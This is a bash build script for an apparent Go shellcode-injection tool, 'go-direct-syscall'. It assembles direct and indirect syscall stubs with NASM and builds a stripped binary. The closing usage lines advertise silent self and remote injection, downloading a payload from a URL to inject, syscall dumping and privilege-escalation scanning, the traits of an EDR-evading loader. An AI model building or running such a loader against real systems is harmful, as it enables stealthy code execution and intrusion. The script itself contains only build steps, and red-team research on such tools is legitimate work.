#!/bin/bash

echo "Building Go Direct Syscall with External Assembly..."

# Step 1: Assemble the assembly files
echo "Assembling do_syscall.S..."
echo "Assembling do_call.S..."
echo "Assembling do_indirect_syscall.S..."
if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "cygwin" ]]; then
    # Windows (Git Bash/MSYS2/Cygwin)
    nasm -f win64 do_syscall.S -o do_syscall.obj
    nasm -f win64 do_call.S -o do_call.obj
    nasm -f win64 do_indirect_syscall.S -o do_indirect_syscall.obj
    
    # Also assemble the PEB access assembly file
    echo "Assembling pkg/syscallresolve/peb_windows_amd64.s..."
    # For Go assembly files, we don't need to do anything special
    # Go will handle .s files automatically during build
    
    SYSCALL_OBJ="do_syscall.obj"
    CALL_OBJ="do_call.obj"
    INDIRECT_SYSCALL_OBJ="do_indirect_syscall.obj"
    SYSCALL_LIB="libdo_syscall.a"
    CALL_LIB="libdo_call.a"
    INDIRECT_SYSCALL_LIB="libdo_indirect_syscall.a"
    EXE_NAME="go-direct-syscall.exe"
    export CGO_ENABLED=1
else
    # Linux/Unix
    nasm -f elf64 do_syscall.S -o do_syscall.o
    nasm -f elf64 do_call.S -o do_call.o
    nasm -f elf64 do_indirect_syscall.S -o do_indirect_syscall.o
    
    # Also assemble the PEB access assembly file
    echo "Assembling pkg/syscallresolve/peb_windows_amd64.s..."
    # For Go assembly files, we don't need to do anything special
    # Go will handle .s files automatically during build
    
    SYSCALL_OBJ="do_syscall.o"
    CALL_OBJ="do_call.o"
    INDIRECT_SYSCALL_OBJ="do_indirect_syscall.o"
    SYSCALL_LIB="libdo_syscall.a"
    CALL_LIB="libdo_call.a"
    INDIRECT_SYSCALL_LIB="libdo_indirect_syscall.a"
    EXE_NAME="go-direct-syscall"
    export CGO_ENABLED=1
fi

# Check if assembly was successful
if [ ! -f "$SYSCALL_OBJ" ]; then
    echo "Error: Failed to assemble do_syscall.S"
    echo "Make sure NASM is installed and in your PATH"
    exit 1
fi

if [ ! -f "$CALL_OBJ" ]; then
    echo "Error: Failed to assemble do_call.S"
    echo "Make sure NASM is installed and in your PATH"
    exit 1
fi

if [ ! -f "$INDIRECT_SYSCALL_OBJ" ]; then
    echo "Error: Failed to assemble do_indirect_syscall.S"
    echo "Make sure NASM is installed and in your PATH"
    exit 1
fi

# Step 2: Create static libraries from the object files
echo "Creating static libraries..."
ar rcs "$SYSCALL_LIB" "$SYSCALL_OBJ"
ar rcs "$CALL_LIB" "$CALL_OBJ"
ar rcs "$INDIRECT_SYSCALL_LIB" "$INDIRECT_SYSCALL_OBJ"

# Check if library creation was successful
if [ ! -f "$SYSCALL_LIB" ]; then
    echo "Error: Failed to create syscall static library"
    echo "Make sure ar is installed and in your PATH"
    exit 1
fi

if [ ! -f "$CALL_LIB" ]; then
    echo "Error: Failed to create call static library"
    echo "Make sure ar is installed and in your PATH"
    exit 1
fi

if [ ! -f "$INDIRECT_SYSCALL_LIB" ]; then
    echo "Error: Failed to create indirect syscall static library"
    echo "Make sure ar is installed and in your PATH"
    exit 1
fi

# Step 3: Build the Go project
echo "Building Go project..."
go build -ldflags="-w -s" -trimpath -o "$EXE_NAME" ./cmd

# Check if Go build was successful
if [ ! -f "$EXE_NAME" ]; then
    echo "Error: Failed to build Go project"
    exit 1
fi

echo "Build completed successfully!"
echo "Files created:"
echo "  - $SYSCALL_OBJ (syscall object file)"
echo "  - $CALL_OBJ (call object file)"
echo "  - $INDIRECT_SYSCALL_OBJ (indirect syscall object file)"
echo "  - $SYSCALL_LIB (syscall static library)"
echo "  - $CALL_LIB (call static library)"
echo "  - $INDIRECT_SYSCALL_LIB (indirect syscall static library)"
echo "  - $EXE_NAME (executable)"
echo ""
echo "Usage:"
echo "  ./$EXE_NAME -example                                              # Self injection with embedded calc (silent)"
echo "  ./$EXE_NAME -debug -example                                       # Self injection with debug logging"
echo "  ./$EXE_NAME -url http://example.com/payload.bin                   # Remote injection (silent)"
echo "  ./$EXE_NAME -url http://example.com/payload.bin -self             # Self injection (silent)"
echo "  ./$EXE_NAME -dump                                                 # Dump syscalls (silent)"
echo "  ./$EXE_NAME -privesc                                              # Scan privilege escalation vectors (silent)"
echo "  ./$EXE_NAME -debug -dump                                          # Dump syscalls with debug output"
echo "  ./$EXE_NAME -debug -privesc                                       # Scan privesc vectors with debug output" 
echo "  ./$EXE_NAME -example -remote                                      # Remote injection with embedded calc"